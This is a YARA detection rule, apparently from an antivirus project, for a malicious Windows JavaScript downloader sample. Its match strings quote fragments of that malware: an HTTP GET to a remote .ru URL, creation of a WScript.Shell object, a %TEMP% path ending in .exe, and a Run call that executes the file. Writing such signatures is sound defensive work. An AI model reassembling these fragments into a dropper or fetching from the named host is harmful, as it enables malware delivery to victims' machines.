rule sig_20160330_ec29b8b765a2f76b4b6225fbc3d87e14 {
  meta:
    description = "datamaliciousorder - file 20160330_ec29b8b765a2f76b4b6225fbc3d87e14.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "043ab2e0083b5e37e0a57c05333a0b1450d672cd13175191de166b02b918b34e"

  strings:
    $s1  = "QB[DQ](\"GET\", \"http://bigmishki.ru/l3osjf\", false);" fullword ascii
    $s2  = "function RU(A, J){UC = UC * 1; return A - J;};" fullword ascii
    $s3  = "var P1 = function HL() {return WScript[QM](\"WScript\"+\".Shell\");}(), E = 11;" fullword ascii
    $s4  = "if (QB[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function BR() {return P1[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"jttUamAdRt.ex\" + \"e\";};" fullword ascii
    $s6  = "function FG(){return F + \"\";};" fullword ascii
    $s7  = "function BX(IY){P1[\"Run\"](IY, UC, UC);};" fullword ascii
    $s8  = "function K() {return ((XQ == true) && (XQ == M)) ? 1 : UC;};" fullword ascii
    $s9  = "function P()" fullword ascii
    $s10 = "}while (N);" fullword ascii
    $s11 = "function RX(){return 22;};" fullword ascii
    $s12 = "return RU(F0, T);" fullword ascii
    $s13 = "var XO = new this[\"Date\"]();" fullword ascii
    $s14 = "function H(){return QM;};" fullword ascii
    $s15 = "function JC(S) {var VH = (1, 2, 3, 4, 5, S); return VH;};" fullword ascii
    $s16 = "var P0 = false;" fullword ascii
    $s17 = "M = true; " fullword ascii
    $s18 = "XQ = true; " fullword ascii
    $s19 = "var XQ = false;" fullword ascii
    $s20 = "} catch(LS){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}